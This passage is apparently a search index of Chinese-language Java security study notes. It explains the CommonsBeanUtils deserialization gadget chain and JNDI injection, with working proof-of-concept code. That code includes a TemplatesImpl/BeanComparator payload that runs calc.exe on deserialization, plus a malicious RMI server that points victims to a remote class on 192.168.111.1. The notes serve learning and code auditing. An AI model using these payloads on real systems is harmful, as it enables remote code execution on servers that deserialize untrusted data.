System.nanoTime(); cc.setName(randomClassName); //cc.writeFile(); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] targetByteCodes = new byte[][]{classBytes}; TemplatesImpl obj = new TemplatesImpl(); setFieldValue(obj, \"_bytecodes\", targetByteCodes); setFieldValue(obj, \"_name\", \"HelloTemplatesImpl\"); setFieldValue(obj, \"_class\", null); final BeanComparator comparator = new BeanComparator(); final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator); setFieldValue(comparator, \"property\", \"outputProperties\"); //\u5c06comparator\u7684property\u4fee\u6539\uff0c\u4f7f\u5176\u5728compare\u65b9\u6cd5\u4e2d\u53bb\u6267\u884cgetOutputProperties setFieldValue(queue, \"queue\", new Object[]{obj, obj}); setFieldValue(queue, \"size\", 2); ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(queue); oos.close(); System.out.println(barr); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object o = (Object)ois.readObject(); } } \u8c03\u7528\u94fe ObjectInputStream.readObject() PriorityQueue#readObject() PriorityQueue#heapify() PriorityQueue#siftDown() PriorityQueue#siftDownUsingComparator() BeanComparator#compare() PropertyUtils#getProperty() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() EvilClass.newInstance() \u603b\u7ed3 \u5c06java.util.PriorityQueue\u4e2d\u7684Comparator\u8bbe\u7f6e\u4e3aBeanComparator\uff0c\u4ece\u800c\u5728BeanComparator#compare\u4e2d\u8c03\u7528getProperty\u65b9\u6cd5\uff0c\u4ece\u800c\u8c03\u7528TemplatesImpl#getOutputProperties\uff0c\u8fdb\u800c\u89e6\u53d1TemplatesImpl _bytecodes\u5b57\u8282\u7801\u6076\u610f\u5b9e\u4f8b\u5316\u3002","title":"CommonsBeanUtils \u53cd\u5e8f\u5217\u5316"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CommonsBeanUtils%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CommonsBeanUtils%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#commonsbeanutils","text":"","title":"CommonsBeanUtils \u53cd\u5e8f\u5217\u5316"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CommonsBeanUtils%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CommonsBeanUtils%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#_1","text":"\u4e86\u89e3Apache Commons BeanUtils \u7684\u529f\u80fd BeanUtils \u4e0e TemplatesImpl Poc \u603b\u7ed3 \u5728CC2\u8fd9\u6761\u94fe\u4e2d\uff0c\u4e3b\u8981\u662f\u901a\u8fc7\u5411java.util.PriorityQueue\u5bf9\u8c61\u4f20\u5165\u6076\u610fjava.util.Comparator\u5bf9\u8c61\uff0c\u5bfc\u81f4\u5728PriorityQueue\u5728\u53cd\u5e8f\u5217\u5316\u8fc7\u7a0b\u4e2d\u6267\u884c\u4e86\u6076\u610fjava.util.Comparator\u7684compare\u65b9\u6cd5\u3002 \u800cjava.util.Comparator\u5b9e\u9645\u662f\u4e00\u4e2a\u63a5\u53e3\uff0c\u6211\u4eec\u5728CC2\u4e2d\u4f20\u5165\u7684\u662f\u5b83\u7684\u4e00\u4e2a\u7ee7\u627f\u7c7b\uff1aTransformingComparator\u3002\u90a3\u4e48\u9664\u4e86TransformingComparator \u4ee5\u5916\u8fd8\u6709\u6ca1\u6709\u5176\u5b83\u80fd\u591f\u9020\u6210\u53cd\u5e8f\u5217\u5316\u653b\u51fb\u7684java.util.Comparator\u5b9e\u73b0\u5bf9\u8c61\u5462\uff1f","title":"\u76ee\u5f55"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CommonsBeanUtils%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CommonsBeanUtils%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#apache-commons-beanutils","text":"Apache Commons\u5de5\u5177\u96c6\u4e0b\u9664\u4e86collections\u4ee5\u5916\u8fd8\u6709BeanUtils \uff0c\u5b83\u4e3b\u8981\u7528\u4e8e\u64cd\u63a7javabean\u3002 \u4e3e\u4e2a\u4e0e\u53cd\u5e8f\u5217\u5316\u653b\u51fb\u6709\u5173\u7684\u64cd\u63a7javabean\u7684\u4f8b\u5b50\u3002 \u8fd9\u91cc\u76f4\u63a5\u5957\u7528p\u725b\u7684\u4f8b\u5b50\u3002 final public class Cat { private String name = \"catalina\"; public String getName() { System.out.println(\"123\"); return name; } public void setName(String name) { this.name = name; } } \u7136\u540e\u6211\u4eec\u6267\u884c PropertyUtils.getProperty(new Cat(), \"name\"); \u8fd9\u4e2a\u65b9\u6cd5\u4f1a\u8c03\u7528\u76ee\u6807\u7c7b\u7684\u76f8\u5173\u5c5e\u6027\u7684getter\u65b9\u6cd5\uff0c\u4e5f\u5c31\u662fCat\u7c7b\u4e2d\u7684getName\u65b9\u6cd5\uff0c\u6240\u4ee5\u8f93\u51fa\u7ed3\u679c\u5982\u4e0b","title":"\u4e86\u89e3Apache Commons BeanUtils \u7684\u529f\u80fd"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CommonsBeanUtils%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CommonsBeanUtils%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#beanutils-templatesimpl","text":"\u6211\u4eec\u901a\u8fc7\u4e0a\u9762\u7684\u53d9\u8ff0\uff0c\u77e5\u9053\u4e86BeanUtils \u5982\u4f55\u8c03\u7528\u76ee\u6807\u7c7b\u67d0\u5c5e\u6027\u7684getter\u65b9\u6cd5\u3002 \u800c\u5728TemplatesImpl\u4e2d\u6709\u5982\u4e0b\u7684\u94fe\uff1aTemplatesImpl#newTransformer() -> TemplatesImpl#getTransletInstance() -> TemplatesImpl#defineTransletClasses() -> TransletClassLoader#defineClass() -> \u6076\u610f\u7c7b\u521d\u59cb\u5316 \u540c\u65f6\u5728TemplatesImpl\u4e2d\u5b58\u5728\u5982\u4e0b\u65b9\u6cd5TemplatesImpl#getOutputProperties() \u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\u5b83\u8c03\u7528\u4e86newTransformer\u5e76\u4e14\u662f\u4e00\u4e2agetter\u65b9\u6cd5\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u60f3\u529e\u6cd5\u7528BeanUtils\u7684PropertyUtils#getProperty\u8c03\u7528\u8be5\u65b9\u6cd5\u4ece\u800c\u5f00\u542fTemplatesImpl\u94fe\uff0c\u4ece\u800c\u6267\u884c\u6076\u610f\u5b57\u8282\u7801\u3002 BeanUtils\u5b58\u5728\u5982\u4e0b\u5305 org.apache.commons.beanutils.BeanComparator\uff0c\u5b83\u7ee7\u627f\u81eajava.util.Comparator\u63a5\u53e3\uff0c\u6240\u4ee5\u5b9e\u73b0\u4e86compare\u65b9\u6cd5\uff1a \u5982\u679c\u4f20\u5165\u4e24\u4e2a\u5bf9\u8c61\u65f6 this.property\u4e0d\u4e3a\u7a7a\uff0c\u5c31\u4f1a\u5206\u522b\u5bf9\u4e24\u4e2a\u5bf9\u8c61\u8c03\u7528PropertyUtils.getProperty\u4ece\u800c\u89e6\u53d1\u5176\u5bf9\u5e94getter\u65b9\u6cd5\u3002 \u7531\u6b64\u6765\u770b\uff0c\u6211\u4eec\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2aBeanComparator\u7c7b\uff0c\u901a\u8fc7\u53cd\u5c04\u7b49\u624b\u6bb5\u5c06\u5176property\u5c5e\u6027\u6539\u6210OutputProperties\uff0c\u518d\u4f7f\u5176\u52a0\u8f7d\u8fdbjava.util.PriorityQueue\uff0c\u5728java.util.PriorityQueue\u53cd\u5e8f\u5217\u5316\u65f6\u81ea\u52a8\u8c03\u7528BeanComparator#compare\uff0c\u8fd9\u4e2a\u65f6\u5019\u60f3\u529e\u6cd5\u5c06\u4f20\u5165\u8be5\u65b9\u6cd5\u7684\u5bf9\u8c61\u6539\u6210\u6076\u610fTemplatesImpl\uff0c\u4f7fPropertyUtils.getProperty\u89e6\u53d1getOutputProperties\u8fd9\u4e2agetter\u65b9\u6cd5\uff0c\u5373\u53ef\u8fbe\u5230\u6076\u610f\u5b57\u8282\u7801\u6267\u884c\u7684\u6548\u679c\u3002 \u5149\u8bf4\u80af\u5b9a\u4f1a\u89c9\u5f97\u62bd\u8c61\uff0c\u4e0b\u9762\u76f4\u63a5\u4e0a\u4ee3\u7801\uff0c\u5176\u4e2d\u5927\u90e8\u5206\u5185\u5bb9\u4e0eCC2\u91cd\u5408\uff0c\u91cd\u5408\u90e8\u5206\u7684\u63cf\u8ff0\u56e0\u6b64\u7565\u8fc7\u3002","title":"BeanUtils \u4e0e TemplatesImpl"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CommonsBeanUtils%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CommonsBeanUtils%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#poc","text":"import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.PriorityQueue; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javassist.*; import org.apache.commons.beanutils.BeanComparator; public class Main { public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } public static void main(String[] args) throws Exception { ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = pool.makeClass(\"Cat\"); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"calc.exe\\\");\"; cc.makeClassInitializer().insertBefore(cmd); String randomClassName = \"EvilCat\" + System.nanoTime(); cc.setName(randomClassName); //cc.writeFile(); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] targetByteCodes = new byte[][]{classBytes}; TemplatesImpl obj = new TemplatesImpl(); setFieldValue(obj, \"_bytecodes\", targetByteCodes); setFieldValue(obj, \"_name\", \"HelloTemplatesImpl\"); setFieldValue(obj, \"_class\", null); final BeanComparator comparator = new BeanComparator(); final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator); setFieldValue(comparator, \"property\", \"outputProperties\"); //\u5c06comparator\u7684property\u4fee\u6539\uff0c\u4f7f\u5176\u5728compare\u65b9\u6cd5\u4e2d\u53bb\u6267\u884cgetOutputProperties setFieldValue(queue, \"queue\", new Object[]{obj, obj}); setFieldValue(queue, \"size\", 2); ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(queue); oos.close(); System.out.println(barr); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object o = (Object)ois.readObject(); } } \u8c03\u7528\u94fe ObjectInputStream.readObject() PriorityQueue#readObject() PriorityQueue#heapify() PriorityQueue#siftDown() PriorityQueue#siftDownUsingComparator() BeanComparator#compare() PropertyUtils#getProperty() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() EvilClass.newInstance()","title":"Poc"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CommonsBeanUtils%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CommonsBeanUtils%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#_2","text":"\u5c06java.util.PriorityQueue\u4e2d\u7684Comparator\u8bbe\u7f6e\u4e3aBeanComparator\uff0c\u4ece\u800c\u5728BeanComparator#compare\u4e2d\u8c03\u7528getProperty\u65b9\u6cd5\uff0c\u4ece\u800c\u8c03\u7528TemplatesImpl#getOutputProperties\uff0c\u8fdb\u800c\u89e6\u53d1TemplatesImpl _bytecodes\u5b57\u8282\u7801\u6076\u610f\u5b9e\u4f8b\u5316\u3002","title":"\u603b\u7ed3"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/JNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/JNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/","text":"JNDI\u6ce8\u5165\u539f\u7406\u6d45\u6790 \u76ee\u5f55 JNDI \u7b80\u4ecb JNDI\u6ce8\u5165 RMI\u5de5\u4f5c\u539f\u7406 Reference\u7c7b JNDI \u534f\u8bae\u8f6c\u6362 JNDI\u6ce8\u5165 JNDI\u6ce8\u5165\u5206\u6790 JNDI\u6ce8\u5165\uff1a\u9ad8\u7248\u672c\u5982\u4f55\u5229\u7528\uff1f TrustURLCodeBase \u6982\u89c8 \u5229\u7528\u672c\u5730\u7c7b TOMCAT8 Groovy ldap\u53cd\u5e8f\u5217\u5316 JNDI\u6ce8\u5165\u4f9d\u8d56RMI\uff0c\u6240\u4ee5\u5728\u5b66\u4e60JNDI\u6ce8\u5165\u524d\u52a1\u5fc5\u4e86\u89e3\u4e00\u4e0bRMI JNDI \u7b80\u4ecb JNDI (Java Naming and Directory Interface) \u662f\u4e00\u4e2ajava\u4e2d\u7684\u6280\u672f\uff0c\u7528\u4e8e\u63d0\u4f9b\u4e00\u4e2a\u8bbf\u95ee\u5404\u79cd\u8d44\u6e90\u7684\u63a5\u53e3\u3002\u6bd4\u5982\u901a\u8fc7JNDI\u53ef\u4ee5\u5728\u5c40\u57df\u7f51\u4e0a\u5b9a\u4f4d\u4e00\u53f0\u6253\u5370\u673a\uff0c\u6216\u8005\u5b9a\u4f4d\u6570\u636e\u5e93\u670d\u52a1\uff0c\u8fdc\u7a0bJAVA\u5bf9\u8c61\u7b49\u3002 JNDI\u5e95\u5c42\u652f\u6301RMI\u8fdc\u7a0b\u5bf9\u8c61\uff0cRMI\u6ce8\u518c\u7684\u670d\u52a1\u53ef\u4ee5\u76f4\u63a5\u88abJNDI\u63a5\u53e3\u8bbf\u95ee\u8c03\u7528\u3002 JNDI\u6ce8\u5165 RMI\u5de5\u4f5c\u539f\u7406 \u9996\u5148\u6211\u4eec\u5148\u601d\u8003\u4e00\u4e0bRMI\u7684\u5de5\u4f5c\u539f\u7406\u662f\u4ec0\u4e48\u3002 1.\u670d\u52a1\u5668\u521b\u5efa\u597d\u7ee7\u627f\u4e8eRemote\u63a5\u53e3\u7684\u7c7b\uff0c\u5e76\u628a\u5b83\u7ed1\u5b9a\u5230RMI\u670d\u52a1\u5668\u4e0a 2.\u5ba2\u6237\u7aef\u8bf7\u6c42RMI\u670d\u52a1\u5668\u4e0a\u7684\u7c7b 3.\u670d\u52a1\u7aef\u8fd4\u56de\u5ba2\u6237\u7aef\u6240\u8bf7\u6c42\u7c7b\u7684\u5b58\u6839stub\uff0c\u5ba2\u6237\u7aef\u5c06\u8fd9\u4e2astub\u770b\u4f5c\u5b9e\u4f8b\u5316\u5bf9\u8c61\u4f7f\u7528 4.\u5ba2\u6237\u7aef\u8c03\u7528stub\u7684\u67d0\u4e2a\u65b9\u6cd5\uff0c\u5e76\u4f20\u5165\u53c2\u6570\u3002\u8be5\u53c2\u6570\u4f1a\u53d1\u9001\u5230RMI\u670d\u52a1\u5668\u4e0a\uff0c\u7531RMI\u670d\u52a1\u5668\u6309\u7167\u5ba2\u6237\u7aef\u4f20\u6765\u7684\u53c2\u6570\u6765\u6267\u884c\u6307\u5b9a\u7684\u65b9\u6cd5 5.\u670d\u52a1\u5668\u6267\u884c\u5b8c\u540e\u5c06\u7ed3\u679c\u8fd4\u56de\u7ed9\u5ba2\u6237\u7aef \u6240\u4ee5\u4eceRMI\u8fd9\u4e00\u7aef\u6765\u770b\uff0c\u5ba2\u6237\u7aef\u83b7\u53d6\u4e86\u8fdc\u7a0b\u5bf9\u8c61\u540e\u6240\u6267\u884c\u7684\u6b64\u5bf9\u8c61\u7684\u65b9\u6cd5\uff0c\u90fd\u662f\u7531RMI\u670d\u52a1\u5668\u6765\u6267\u884c\u7684\u3002 Reference\u7c7b \u9996\u5148\u6765\u770b\u4e00\u4e0b\u5982\u4f55\u521b\u5efa\u4e00\u4e2a\u5bf9\u8c61Reference\u5e76\u5c06\u5176\u7ed1\u5b9a\u5230RMI\u670d\u52a1\u5668\u4e0a ......\u5b9a\u4e49\u597d\u4e86registry\uff0c\u5b83\u662f\u4e00\u4e2aRegistry\u5bf9\u8c61\uff08RMI\u4e2d\u7528\u4e8e\u5c06\u7c7b\u6ce8\u518c\u5230\u670d\u52a1\u5668\u4e0a\u7684\u5bf9\u8c61\uff09 Reference refObj = new Reference(\"refClassName\", \"insClassName\", \"http://a.com:12345\"); ReferenceWrapper refObjWrapper = new ReferenceWrapper(refObj); registry.bind(\"refObj\", refObjWrapper); \u524d\u9762\u8bf4\u5230RMI\u670d\u52a1\u5668\u4f1a\u5411\u5ba2\u6237\u7aef\u8fd4\u56destub\u6216\u8005\u8bf4\u4e00\u4e2a\u5bf9\u8c61\uff0c\u5982\u679cRMI\u670d\u52a1\u5668\u4f20\u56de\u5ba2\u6237\u7aef\u4e00\u4e2aReference\u5bf9\u8c61\u5462\uff1f\u90a3\u5c31\u8981\u8bf4\u9053\u8bf4\u9053\u4e86\u3002 \u5bf9\u4e8eRMI\u670d\u52a1\u5668\u800c\u8a00\uff0c\u5411\u5ba2\u6237\u7aef\u4f20\u56de\u4e00\u4e2aReference\u5bf9\u8c61\u548c\u4f20\u56de\u5176\u4ed6\u5bf9\u8c61\u4e00\u6837\uff0c\u5e76\u6ca1\u6709\u591a\u5927\u533a\u522b\u3002 \u4f46\u662f\u5ba2\u6237\u7aef\u7531\u4e8e\u83b7\u53d6\u5230\u4e86\u4e00\u4e2aReference\u5b9e\u4f8b\uff0c\u6bd4\u5982\u8bf4\u5c31\u662f\u4e0a\u9762\u4ee3\u7801\u4e2d\u7684Reference\u5b9e\u4f8b\uff0c\u63a5\u4e0b\u6765\u5ba2\u6237\u7aef\u5c31\u4f1a\u5148\u5728CLASSPATH\u91cc\u5bfb\u627e\u88ab\u6807\u8bc6\u4e3arefClassName\u7684\u7c7b\u3002\u5982\u679c\u6ca1\u627e\u5230\uff0c\u5b83\u5c31\u4f1a\u53bb\u8bf7\u6c42http\\://a.com:12345/refClassName.class \u5bf9\u91cc\u9762\u7684\u7c7b\u8fdb\u884c\u52a8\u6001\u52a0\u8f7d\uff0c\u5e76\u8c03\u7528insClassName\u7c7b\u7684\u6784\u9020\u65b9\u6cd5\u3002\u6ce8\u610f\uff0c\u8c03\u7528insClassName\u7c7b\u7684\u6784\u9020\u65b9\u6cd5\u8fd9\u4e2a\u884c\u4e3a\u662f\u7531\u5ba2\u6237\u7aef\u5b8c\u6210\u7684\u3002 \u4e0a\u9762\u7684\u4e00\u7cfb\u5217\u884c\u4e3a\u53ef\u4ee5\u6982\u62ec\u4e3axiatu JNDI \u534f\u8bae\u8f6c\u6362 \u6211\u4eec\u5728\u901a\u8fc7JNDI\u8c03\u7528\u8fdc\u7a0b\u5bf9\u8c61\u65f6\uff0c\u9700\u8981\u8bbe\u7f6e\u73af\u5883\uff0c\u5c31\u50cf\u8fd9\u6837 Properties env = new Properties(); env.put(Context.INITIAL_CONTEXT_FACTORY, \"com.sun.jndi.rmi.registry.RegistryContextFactory\"); //\u8bbe\u7f6e\u4e86rmi\u8bf7\u6c42\u65b9\u5f0f env.put(Context.PROVIDER_URL, \"rmi://localhost:1099\"); Context ctx = new InitialContext(env); \u6bd4\u5982\u4ee5\u4e0a\u4ee3\u7801\uff0c\u5c31\u8bbe\u7f6e\u4e86JNDI\u4f1a\u901a\u8fc7rmi\u7684\u65b9\u5f0f\u53bb\u8bf7\u6c42\u8fdc\u7a0b\u5bf9\u8c61\u3002 \u4f46\u662f\u5f53\u8c03\u7528lookup()\u6216\u8005search()\u65f6\uff0c\u53ef\u4ee5\u76f4\u63a5\u65e0\u89c6\u73af\u5883\u662f\u5982\u4f55\u8bbe\u7f6e\u8bf7\u6c42\u65b9\u5f0f\u7684\uff0c\u56e0\u4e3aJNDI\u6709\u534f\u8bae\u52a8\u6001\u8f6c\u6362\u673a\u5236\u3002\u4ec0\u4e48\u610f\u601d\u5462\uff1f\u770b\u770b\u4ee3\u7801\u5c31\u6653\u5f97\u4e86 Properties env = new Properties(); env.put(Context.INITIAL_CONTEXT_FACTORY, \"com.sun.jndi.rmi.registry.RegistryContextFactory\"); env.put(Context.PROVIDER_URL, \"rmi://localhost:1099\"); Context ctx = new InitialContext(env); ctx.lookup(\"ldap://a.com/ou=foo,dc=foobar,dc=com\") \u4ee5\u4e0a\u4ee3\u7801\u6267\u884c\u540e\uff0c\u4f1a\u8c03\u7528ldap\u534f\u8bae\u53bb\u8bf7\u6c42\uff0c\u800c\u4e0d\u662frmi\u3002 \u8fd9\u662f\u56e0\u4e3alookup\u6216\u8005search\u51fd\u6570\u5728\u53c2\u6570\u4e3a\u7edd\u5bf9\u8def\u5f84URI\u7684\u60c5\u51b5\u4e0b\u52a8\u6001\u8f6c\u6362\u534f\u8bae\u4e3a\u53c2\u6570\u4e2d\u6307\u5b9a\u7684\u534f\u8bae\u3002 JNDI\u6ce8\u5165 \u5982\u679c\u6211\u4eec\u6ee1\u8db3\u4ee5\u4e0b\u6761\u4ef6\uff0cJNDI\u6ce8\u5165\u5c31\u4f1a\u6210\u529f JNDI\u8c03\u7528\u7684lookup\u53c2\u6570\u53ef\u63a7 URI\u53ef\u8fdb\u884c\u52a8\u6001\u534f\u8bae\u8f6c\u6362 Reference\u5bf9\u8c61\u6307\u5b9a\u7c7b\u4f1a\u88ab\u52a0\u8f7d\u5e76\u5b9e\u4f8b\u5316 \u5176\u5b9e\u6700\u91cd\u8981\u7684\u5c31\u662f\u7b2c\u4e00\u6761\u3002 \u4e0b\u9762\u7528\u4e00\u5f20\u56fe\u6982\u62ec\u4eceJNDI\u6ce8\u5165\u5230RCE\u7684\u6d41\u7a0b 1.\u653b\u51fb\u8005\u63a7\u5236\u4e86lookup\u53c2\u6570 2.\u653b\u51fb\u8005\u5c06lookup\u53c2\u6570\u66ff\u6362\u4e3a\u53bb\u8bf7\u6c42\u6076\u610f\u670d\u52a1\u5668A\u4e0a\u7684Reference\u5bf9\u8c61 3.\u6076\u610f\u670d\u52a1\u5668A\u8fd4\u56deReference\u5bf9\u8c61 4.\u53d7\u5bb3\u673a\u5668\u83b7\u5f97Reference\u5bf9\u8c61\u540e\u5148\u5728CLASSPATH\u4e2d\u67e5\u627eReference\u5bf9\u8c61\u4e2d\u7684\u6307\u5b9a\u7c7b\u662f\u5426\u5b58\u5728\uff0c\u82e5\u4e0d\u5b58\u5728\u5219\u8bf7\u6c42Reference\u5bf9\u8c61\u4e2d\u6307\u5b9a\u7684\u6076\u610f\u670d\u52a1\u5668B\u53bb\u83b7\u5f97\u6307\u5b9a\u7c7b 5.\u6076\u610f\u670d\u52a1\u5668B\u8fd4\u56de\u6307\u5b9a\u7c7b 6.\u53d7\u5bb3\u673a\u5668\u5f97\u5230\u6307\u5b9a\u7c7b\u540e\uff0c\u6267\u884c\u6307\u5b9a\u7c7b\u7684\u6784\u9020\u51fd\u6570\uff0c\u4ece\u800c\u8fbe\u5230RCE \u4e0b\u9762\u662f\u4ee3\u7801\u5b9e\u73b0 \u53d7\u5bb3\u673a\u5668 import java.rmi.Remote; import java.rmi.RemoteException; import javax.naming.Context; import javax.naming.InitialContext; interface IHello extends Remote { abstract String sayHello(String name) throws RemoteException; } public class CallService { public static void main(String args[]) throws Exception{ if(args.length<1){ System.out.println(\"Plz input url\"); System.exit(-1); } else { // JNDI \u83b7\u53d6 RMI \u4e0a\u7684\u65b9\u6cd5\u5bf9\u8c61\u5e76\u8fdb\u884c\u8c03\u7528 Context ctx = new InitialContext(); IHello rHello = (IHello) ctx.lookup((String)args[0]); System.out.println(rHello.sayHello(\"tom\")); } } } RMI import com.sun.jndi.rmi.registry.ReferenceWrapper; import javax.naming.Reference; import java.rmi.Remote; import java.rmi.RemoteException; import java.rmi.registry.*; import java.rmi.server.UnicastRemoteObject; public class evilrmi { public static void main(String[] args) throws Exception{ Registry registry = LocateRegistry.createRegistry(1010); Reference refObj = new Reference(\"EvilObject\",\"EvilObject\",\"http://192.168.111.1:80/\"); ReferenceWrapper refObjWra = new ReferenceWrapper(refObj); registry.bind(\"refObj\",refObjWra); System.out.println(\"gogo\"); } } EvilObject import java.lang.Runtime; import java.lang.Process; public class EvilObject { public EvilObject() throws Exception { Runtime rt = Runtime.getRuntime(); String[] commands = {\"calc\"}; Process pc = rt.exec(commands); pc.waitFor(); } } \u6211\u4eec\u5148\u8fd0\u884cRMI\u670d\u52a1\u5668\uff0c\u7136\u540e\u628aEvilObject.class\u653e\u7f6e\u4e8ehttp\\://192.168.111.1:80/\u4e0b\uff0c\u7136\u540e\u6307\u5b9alookup\u53c2\u6570\u4e3a\u6211\u4eec\u7684\u6076\u610fRMI\u670d\u52a1\u5668\u53bb\u8fd0\u884c\u53d7\u5bb3\u673a\u5668\u3002 JNDI\u6ce8\u5165\u5206\u6790 \u8c03\u7528\u6808\u5982\u4e0b \u8ddf\u8fdblookup\u65b9\u6cd5\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u6b64\u5904 \u518d\u6b21\u8ddf\u8fdblookup\u65b9\u6cd5 \u518d\u6b21\u8ddf\u8fdblookup\u65b9\u6cd5 \u8ddf\u8fdbdecodeObject \u8ddf\u8fdb\uff0c\u6765\u5230\u6b64\u5904\u3002\u6b64\u5904getObjectFactoryFromReference \u662f\u53bb\u83b7\u53d6Reference\u5bf9\u8c61\u3002 ref\u548cf\u6b64\u65f6\u5206\u522b\u5bf9\u5e94\u7684\u503c\u4e3aReference\u7c7b\u540d\u548cReference\u6307\u5411\u7684\u7c7b\u7684\u7c7b\u540d \u518d\u5ea6\u8ddf\u8fdb 1\u5904\u662f\u5c1d\u8bd5\u672c\u5730\u52a0\u8f7d\uff08\u4eceCLASSPATH\u4e2d\uff09Reference\u6307\u5b9a\u7684\u7c7b\uff0c2\u5904\u662f\u5982\u679c\u672c\u5730\u65e0\u6cd5\u52a0\u8f7d\u4e14ref\u4e2dclassFactoryLocation\u5c5e\u6027\u503c\u4e0d\u4e3a\u7a7a\uff0c\u5c31\u4ece\u6b64\u5c5e\u6027\u6307\u5b9a\u7684\u503c\u8fdc\u7a0b\u83b7\u53d6\u52a0\u8f7d\u7c7b\u3002\u6700\u540e\u57283\u5904\u5bf9\u52a0\u8f7d\u5230\u7c7b\u6267\u884c\u5b9e\u4f8b\u5316\uff0c\u4ece\u800c\u89e6\u53d1\u6784\u9020\u51fd\u6570\u3002 JNDI\u6ce8\u5165\uff1a\u9ad8\u7248\u672c\u5982\u4f55\u5229\u7528\uff1f TrustURLCodeBase JDK 6u141, JDK 7u131, JDK 8u121 \u4ee5\u53ca\u66f4\u9ad8\u7248\u672c\u4e2dJava\u63d0\u5347\u4e86JNDI \u9650\u5236\u4e86Naming/Directory\u670d\u52a1\u4e2dJNDI Reference \u8fdc\u7a0b \u52a0\u8f7dObject Factory\u7c7b\u7684\u7279\u6027\uff0c\u6240\u4ee5\u4f1a\u6267\u884c\u4ee5\u4e0a\u6d41\u7a0b\u4f1a\u6709\u5982\u4e0b\u62a5\u9519 The object factory is untrusted. Set the system property 'com.sun.jndi.rmi.object.trustURLCodebase' to 'true'. \u7cfb\u7edf\u5c5e\u6027 com.sun.jndi.rmi.object.trustURLCodebase\u3001com.sun.jndi.cosnaming.object.trustURLCodebase \u7684\u9ed8\u8ba4\u503c\u53d8\u4e3afalse\uff0c\u5373\u9ed8\u8ba4\u4e0d\u5141\u8bb8\u4ece\u8fdc\u7a0b\u7684Codebase\u52a0\u8f7dReference\u5de5\u5382\u7c7b\u3002 \u6982\u89c8 \u4ee5\u4e0a\u662fJNDI Reference+RMI\u7684\u5229\u7528\u65b9\u5f0f\uff0c\u9664\u6b64\u4e4b\u5916\u8fd8\u6709\u4e00\u4e2aJNDI Reference+ldap \u7684\u5229\u7528\u65b9\u5f0f\uff0c\u64cd\u4f5c\u4e0eJNDI Reference+RMI\u5927\u540c\u5c0f\u5f02\uff0c\u4e5f\u5c31\u662f\u901a\u8fc7ldap\u534f\u8baelookup\u4e00\u4e2a\u6076\u610f\u670d\u52a1\u5668\u5e76\u83b7\u5f97\u6076\u610fReference\u5bf9\u8c61\uff0c\u5e76\u4e14LDAP\u670d\u52a1\u7684Reference\u8fdc\u7a0b\u52a0\u8f7dFactory\u7c7b\u4e0d\u53d7 